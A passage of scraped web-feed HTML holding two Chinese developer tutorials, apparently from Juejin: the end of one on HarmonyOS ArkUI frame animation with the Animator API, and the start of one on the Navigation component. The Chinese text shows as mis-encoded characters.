                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å°±æ˜¯ç±»ä¼¼æ’­æ”¾ç”µå½±ä¸€æ ·ï¼Œä¸€å¸§ä¸€å¸§çš„è¿›è¡Œæ’­æ”¾ï¼Œç›¸å¯¹äºå±æ€§åŠ¨ç”»ï¼Œå…¶æ¯ä¸€å¸§ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥è¿›è¡Œè®¾ç½®ç›¸å…³çš„å±æ€§å€¼ï¼Œå¹¶ä¸”å…·æœ‰æš‚åœæ’­æ”¾ï¼Œç»§ç»­æ’­æ”¾çš„ä¼˜ç‚¹ï¼Œè€Œä¸”è¿˜å…·å¤‡äº‹ä»¶çš„å®æ—¶å“åº”ï¼Œéœ€è¦è¯´æ˜çš„æ˜¯ï¼Œåœ¨æ€§èƒ½ä¸Šæ˜¯è¿œè¿œä¸å¦‚å±æ€§åŠ¨ç”»çš„ï¼Œæ‰€ä»¥å¦‚æœèƒ½ç”¨å±æ€§åŠ¨ç”»å®ç°çš„åœºæ™¯ï¼Œè¿˜æ˜¯ä¸»æ¨å±æ€§åŠ¨ç”»</p>
<ul>
<li>éœ€è¦æ§åˆ¶åŠ¨ç”»æ’­æ”¾æš‚åœï¼šéŸ³ä¹æ’­æ”¾ã€æˆ–è€…è¿åŠ¨å°è½¦</li>
<li>ç¿»é¡µåŠ¨ç”»</li>
</ul>
<h2 data-id="heading-0">åŸºç¡€ä½¿ç”¨</h2>
<ul>
<li>
<p>åˆ›å»ºå¸§åŠ¨ç”»   this.animator =   Animator.create()</p>
</li>
<li>
<p>æ¯ä¸€å¸§å›è°ƒ    this.animator.onFrame=fn</p>
</li>
<li>
<p>æ§åˆ¶           this.animator.play/pause()</p>
</li>
</ul>
<h5 data-id="heading-1">ç¤ºä¾‹ä»£ç 1</h5>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> { <span class="hljs-selector-tag">Animator</span>, <span class="hljs-selector-tag">AnimatorResult</span> } <span class="hljs-selector-tag">from</span> '@<span class="hljs-selector-tag">kit</span><span class="hljs-selector-class">.ArkUI</span>'

@<span class="hljs-selector-tag">Entry</span>
@<span class="hljs-selector-tag">Component</span>
<span class="hljs-selector-tag">struct</span> <span class="hljs-selector-tag">Index</span> {
  <span class="hljs-comment">// 1. åˆ›å»ºå¸§åŠ¨ç”»</span>
  <span class="hljs-variable">@State</span> <span class="hljs-attribute">animator</span>:AnimatorResult  = Animator.<span class="hljs-built_in">create</span>({
    <span class="hljs-attribute">duration</span>: <span class="hljs-number">3000</span>, <span class="hljs-comment">//åŠ¨ç”»æ’­æ”¾çš„æ—¶é•¿</span>
    <span class="hljs-attribute">delay</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">//åŠ¨ç”»å»¶æ—¶æ’­æ”¾æ—¶é•¿</span>
    <span class="hljs-attribute">easing</span>: <span class="hljs-string">'linear'</span>, <span class="hljs-comment">//åŠ¨ç”»æ’å€¼æ›²çº¿</span>
    <span class="hljs-attribute">iterations</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">//åŠ¨ç”»æ’­æ”¾æ¬¡æ•°</span>
    <span class="hljs-attribute">fill</span>: <span class="hljs-string">"forwards"</span>, <span class="hljs-comment">//åŠ¨ç”»æ‰§è¡Œåæ˜¯å¦æ¢å¤åˆ°åˆå§‹çŠ¶æ€</span>
    <span class="hljs-attribute">direction</span>: <span class="hljs-string">'normal'</span>, <span class="hljs-comment">//åŠ¨ç”»æ’­æ”¾æ¨¡å¼</span>
    <span class="hljs-attribute">begin</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">//åŠ¨ç”»æ’å€¼èµ·ç‚¹</span>
    <span class="hljs-attribute">end</span>: <span class="hljs-number">100</span><span class="hljs-comment">//åŠ¨ç”»æ’å€¼ç»ˆç‚¹</span>
  })

  <span class="hljs-variable">@State</span> <span class="hljs-attribute">translateX</span>: number = <span class="hljs-number">0</span>
  <span class="hljs-variable">@State</span> <span class="hljs-attribute">translateY</span>: number = <span class="hljs-number">0</span>

  <span class="hljs-built_in">aboutToAppear</span>(): void {
    <span class="hljs-comment">// 2.æ¯ä¸€å¸§å›è°ƒ</span>
    <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.animator</span><span class="hljs-selector-class">.onFrame</span> = (<span class="hljs-attribute">progress</span>: number) =&gt; {
      <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.translateX</span> = <span class="hljs-selector-tag">progress</span>
    }
  }

  <span class="hljs-selector-tag">build</span>() {
    <span class="hljs-selector-tag">Column</span>({space:20}) {

      <span class="hljs-selector-tag">Text</span>(<span class="hljs-string">"1"</span>)<span class="hljs-selector-class">.width</span>(<span class="hljs-number">30</span>)<span class="hljs-selector-class">.height</span>(<span class="hljs-number">30</span>)<span class="hljs-selector-class">.backgroundColor</span>(Color.Red)<span class="hljs-selector-class">.textAlign</span>(TextAlign.Center)<span class="hljs-selector-class">.margin</span>({ <span class="hljs-attribute">top</span>: <span class="hljs-number">100</span> })
        <span class="hljs-selector-class">.translate</span>({ x: this.translateX, y: this.translateY })

      <span class="hljs-selector-tag">Button</span>(<span class="hljs-string">"æ’­æ”¾"</span>)<span class="hljs-selector-class">.onClick</span>(() =&gt; this.animator.<span class="hljs-built_in">play</span>() )
      <span class="hljs-selector-tag">Button</span>(<span class="hljs-string">"æš‚åœ"</span>)<span class="hljs-selector-class">.onClick</span>(() =&gt;  this.animator.<span class="hljs-built_in">pause</span>() )
      <span class="hljs-selector-tag">Button</span>(<span class="hljs-string">"é‡ç½®"</span>)<span class="hljs-selector-class">.onClick</span>(() =&gt; {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.translateX</span> = <span class="hljs-number">0</span>
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.translateY</span> = <span class="hljs-number">0</span>
      })
    }
    <span class="hljs-selector-class">.height</span>(<span class="hljs-string">'100%'</span>)
    <span class="hljs-selector-class">.width</span>(<span class="hljs-string">'100%'</span>)
  }
}
</code></pre>
<h2 data-id="heading-2">ç¤ºä¾‹ä»£ç 2ï¼šå®æˆ˜éŸ³ä¹æ’­æ”¾å™¨</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Animator</span>, <span class="hljs-title class_">AnimatorResult</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.ArkUI'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">angle</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>

  <span class="hljs-comment">// 1 åˆ›å»ºå¸§åŠ¨ç”»å¯¹è±¡</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">animator</span>: <span class="hljs-title class_">AnimatorResult</span> = <span class="hljs-title class_">Animator</span>.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">duration</span>: <span class="hljs-number">10000</span>,  <span class="hljs-comment">//   æŒç»­æ—¶é—´</span>
    <span class="hljs-attr">delay</span>: <span class="hljs-number">0</span>,         <span class="hljs-comment">//   å»¶è¿Ÿæ—¶é—´</span>
    <span class="hljs-attr">easing</span>: <span class="hljs-string">"linear"</span>, <span class="hljs-comment">//   åŠ¨ç”»æ›²çº¿</span>
    <span class="hljs-attr">iterations</span>: -<span class="hljs-number">1</span>,   <span class="hljs-comment">//   æ’­æ”¾æ¬¡æ•°</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">"none"</span>,     <span class="hljs-comment">//   æ’­æ”¾æ¨¡å¼ æ’­æ”¾ä¹‹å¤–çš„çŠ¶æ€</span>
    <span class="hljs-attr">direction</span>: <span class="hljs-string">"normal"</span>, <span class="hljs-comment">//   æ’­æ”¾æ–¹å‘</span>
    <span class="hljs-attr">begin</span>: <span class="hljs-number">0</span>,   <span class="hljs-comment">// å¼€å§‹è§’åº¦</span>
    <span class="hljs-attr">end</span>: <span class="hljs-number">360</span> <span class="hljs-comment">// ç»“æŸè§’åº¦</span>
  })

  <span class="hljs-title function_">aboutToAppear</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">//   2 ç›‘å¬å¸§å˜åŒ–äº‹ä»¶</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">animator</span>.<span class="hljs-property">onFrame</span> = <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">angle</span> = value
    }
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'å¼€å§‹'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-function">(<span class="hljs-params">event: ClickEvent</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">animator</span>.<span class="hljs-title function_">play</span>()
      })
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'æš‚åœ'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-function">(<span class="hljs-params">event: ClickEvent</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">animator</span>.<span class="hljs-title function_">pause</span>()
      })
      <span class="hljs-title class_">Stack</span>() {
        <span class="hljs-title class_">Image</span>(<span class="hljs-string">"https://p6.music.126.net/obj/wonDlsKUwrLClGjCm8Kx/28513831157/e8e9/beeb/912c/468bcb523668065ccf6f853c4a084e31.png"</span>)
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">300</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">300</span>)

        <span class="hljs-title class_">Image</span>(<span class="hljs-string">"https://p1.music.126.net/MX4wNwR9eJNvx_Y5AKBEFw==/109951169909770184.jpg?imageView&amp;thumbnail=360y360&amp;quality=75&amp;tostatic=0"</span>)
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">200</span>)
          .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">200</span>)
          .<span class="hljs-title function_">rotate</span>({
            <span class="hljs-attr">angle</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">angle</span>
          })

      }.<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>).<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    }
  }
}

</code></pre>
<h2 data-id="heading-3">ç¤ºä¾‹ä»£ç 3ï¼šå›¾ç‰‡å¸§åŠ¨ç”»</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references%2Fts-basic-components-imageanimator%23%25E7%25A4%25BA%25E4%25BE%258B1%25E6%2592%25AD%25E6%2594%25BEresource%25E5%258A%25A8%25E7%2594%25BB" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references/ts-basic-components-imageanimator#%E7%A4%BA%E4%BE%8B1%E6%92%AD%E6%94%BEresource%E5%8A%A8%E7%94%BB" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cnâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jq22.com%2Fyanshi24013" target="_blank" title="https://www.jq22.com/yanshi24013" ref="nofollow noopener noreferrer">www.jq22.com/yanshi24013</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jq22.com%2Fdemo%2FimgAni202108230153%2Fimg%2F611e2b5c8fcd2.png" target="_blank" title="https://www.jq22.com/demo/imgAni202108230153/img/611e2b5c8fcd2.png" ref="nofollow noopener noreferrer">www.jq22.com/demo/imgAniâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F0a0a956faec348ddaa9b2676a3f19545%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/0a0a956faec348ddaa9b2676a3f19545?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">é¸¿è’™å¼€å‘ç­çº§</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS ç»„ä»¶å¯¼èˆªï¼ˆNavigationï¼‰]]></title>    <link>https://juejin.cn/post/7576955345378426943</link>    <guid>https://juejin.cn/post/7576955345378426943</guid>    <pubDate>2025-11-27T05:22:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345378426943" data-draft-id="7576953459544293430" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS ç»„ä»¶å¯¼èˆªï¼ˆNavigationï¼‰"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-27T05:22:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ITå……ç”µç«™"/> <meta itemprop="url" content="https://juejin.cn/user/125809758576431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS ç»„ä»¶å¯¼èˆªï¼ˆNavigationï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/125809758576431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ITå……ç”µç«™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:22:47.000Z" title="Thu Nov 27 2025 05:22:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>âœ¨å®¶äººä»¬è®°å¾—ç‚¹ä¸ªè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<h2 data-id="heading-0">ç»„ä»¶å¯¼èˆªï¼ˆNavigationï¼‰</h2>
<p><strong>Navigationæ˜¯è·¯ç”±å®¹å™¨ç»„ä»¶ï¼Œä¸€èˆ¬ä½œä¸ºé¦–é¡µçš„æ ¹å®¹å™¨</strong>ï¼ŒåŒ…æ‹¬å•æ (Stack)ã€åˆ†æ (Split)å’Œè‡ªé€‚åº”(Auto)ä¸‰ç§æ˜¾ç¤ºæ¨¡å¼ã€‚Navigationç»„ä»¶é€‚ç”¨äºæ¨¡å—å†…å’Œè·¨æ¨¡å—çš„è·¯ç”±åˆ‡æ¢ï¼Œ<strong>ä¸€æ¬¡å¼€å‘ï¼Œå¤šç«¯éƒ¨ç½²åœºæ™¯</strong>ã€‚é€šè¿‡ç»„ä»¶çº§è·¯ç”±èƒ½åŠ›å®ç°æ›´åŠ è‡ªç„¶æµç•…çš„è½¬åœºä½“éªŒï¼Œå¹¶æä¾›å¤šç§æ ‡é¢˜æ æ ·å¼æ¥å‘ˆç°æ›´å¥½çš„æ ‡é¢˜å’Œå†…å®¹è”åŠ¨æ•ˆæœã€‚åœ¨ä¸åŒå°ºå¯¸çš„è®¾å¤‡ä¸Šï¼ŒNavigationç»„ä»¶èƒ½å¤Ÿè‡ªé€‚åº”æ˜¾ç¤ºå¤§å°ï¼Œè‡ªåŠ¨åˆ‡æ¢åˆ†æ å±•ç¤ºæ•ˆæœã€‚</p>
<ul>
<li>æ¨¡å—å†…ã€å’Œè·¨æ¨¡å—å®ç°è·¯ç”±åˆ‡æ¢</li>
<li>ä¸€æ¬¡å¼€å‘ï¼Œå¤šç«¯éƒ¨ç½²åœºæ™¯</li>
<li>é€šè¿‡ç»„ä»¶çº§è·¯ç”±èƒ½åŠ›å®ç°æ›´åŠ è‡ªç„¶æµç•…çš„è½¬åœºä½“éªŒ</li>
<li>æ›´å¥½çš„æ ‡é¢˜ã€tabBarç­‰ç­‰è”åŠ¨æ•ˆæœ</li>
<li>ç­‰ç­‰</li>
</ul>
<h3 data-id="heading-1">2.1 Navigationå±æ€§</h3>
<pre><code class="hljs language-plain" lang="plain">@Entry
@Component
struct Index {
  build() {
    Navigation() {

    }
      .title("ä¸»æ ‡é¢˜")
      .mode()
      .toolbarConfiguration()
      .menus()
  }
}
</code></pre>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a35e8cb486c548f58d6cd679d206bdbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=1BELIzfK9%2FsamvrTX%2F9ZWVSZ6uA%3D" height="600" loading="lazy"/> 
<h4 data-id="heading-2">title è®¾ç½®æ ‡é¢˜</h4>
<p>æ˜¾ç¤ºåœ¨è¿™ä¸ªä¸»æ ‡é¢˜çš„ä½ç½®</p>
<h4 data-id="heading-3">titleMode æ ‡é¢˜æ æ¨¡å¼</h4>
<p>æ ‡é¢˜æ åœ¨ç•Œé¢é¡¶éƒ¨ï¼Œç”¨äºå‘ˆç°ç•Œé¢åç§°å’Œæ“ä½œå…¥å£ï¼ŒNavigationç»„ä»¶é€šè¿‡titleModeå±æ€§è®¾ç½®æ ‡é¢˜æ æ¨¡å¼</p>
<ul>
<li>Miniæ¨¡å¼ï¼šæ™®é€šå‹æ ‡é¢˜æ ï¼Œç”¨äºä¸€çº§é¡µé¢ä¸éœ€è¦çªå‡ºæ ‡é¢˜çš„åœºæ™¯</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b32f7f788a92418db94235561541f02f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=tMsfFeHoRHHSv7gE4S4h5ynagj8%3D" alt="img" loading="lazy"/></p>
<ul>
<li>Fullæ¨¡å¼ï¼šå¼ºè°ƒå‹æ ‡é¢˜æ ï¼Œç”¨äºä¸€çº§é¡µé¢éœ€è¦çªå‡ºæ ‡é¢˜çš„åœºæ™¯ã€‚</li>
</ul>
